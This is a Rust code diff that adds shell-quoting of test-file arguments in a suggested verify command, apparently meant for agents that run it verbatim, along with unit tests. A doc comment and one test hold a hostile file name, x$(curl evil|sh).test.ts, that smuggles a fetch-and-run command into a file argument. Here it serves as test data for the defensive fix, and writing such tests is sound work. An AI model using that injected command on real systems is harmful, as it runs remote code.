@@ -665,7 +665,7 @@ pub(crate) fn verify_command_for_discovery(
 
     // Normalize separators: CRITICAL for Windows-blessed goldens to pass
     // Linux CI.
-    let file_str = normalized_path(&rel_file);
+    let file_str = shell_quote_file_arg(&normalized_path(&rel_file));
 
     // Framework takes priority over runner.
     let cmd = match discovery.framework_hint {
@@ -689,6 +689,26 @@ pub(crate) fn verify_command_for_discovery(
         }
     };
     Some(cmd)
+}
+
+/// Shell-quote a test-file argument for the suggested verify command.
+///
+/// The primary consumer of the suggested command is an agent that may run it
+/// verbatim in a POSIX-like shell, so a hostile file name such as
+/// `x$(curl evil|sh).test.ts` (legal on Linux) must not become a
+/// copy-paste code-execution vector. Plain alphanumeric/relative paths pass
+/// through unchanged so the common command stays readable; anything else is
+/// single-quoted with embedded single quotes escaped POSIX-style (`'\''`),
+/// which suppresses all shell expansion.
+fn shell_quote_file_arg(file_str: &str) -> String {
+    if !file_str.is_empty()
+        && file_str
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-'))
+    {
+        return file_str.to_string();
+    }
+    format!("'{}'", file_str.replace('\'', "'\\''"))
 }
 
 /// Convert an absolute path back to a path relative to `base`.  If the
@@ -1465,6 +1485,54 @@ mod tests {
             cmd.contains("tests/auth/token.test.ts"),
             "expected normalized path: {cmd}"
         );
+    }
+
+    #[test]
+    fn verify_command_hostile_filename_is_shell_quoted() {
+        // Security: a file name containing shell metacharacters is legal on
+        // Linux and must not become a code-exec vector when an agent runs the
+        // suggested command verbatim.
+        let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
+        let result = verify_command_for_discovery(
+            &discovery,
+            Path::new("tests/x$(curl evil|sh).test.ts"),
+        );
+        assert_eq!(
+            result,
+            Some("jest 'tests/x$(curl evil|sh).test.ts'".to_string()),
+            "metacharacters must be neutralized by single-quoting"
+        );
+    }
+
+    #[test]
+    fn verify_command_filename_with_space_is_shell_quoted() {
+        let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
+        let result =
+            verify_command_for_discovery(&discovery, Path::new("tests/my file.test.ts"));
+        assert_eq!(
+            result,
+            Some("jest 'tests/my file.test.ts'".to_string())
+        );
+    }
+
+    #[test]
+    fn verify_command_filename_with_single_quote_is_escaped() {
+        let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
+        let result =
+            verify_command_for_discovery(&discovery, Path::new("tests/o'brien.test.ts"));
+        assert_eq!(
+            result,
+            Some("jest 'tests/o'\\''brien.test.ts'".to_string()),
+            "embedded single quote must be escaped POSIX-style"
+        );
+    }
+
+    #[test]
+    fn verify_command_plain_filename_stays_unquoted() {
+        // Readability: the common case must not acquire quotes.
+        let discovery = make_discovery(Some("."), Some(TsFramework::Jest), None);
+        let result = verify_command_for_discovery(&discovery, Path::new("tests/math.test.ts"));
+        assert_eq!(result, Some("jest tests/math.test.ts".to_string()));
     }
 
     // ── Gap-3 honesty-clarity controls (RIPR-SPEC-0101) ──────────────────────
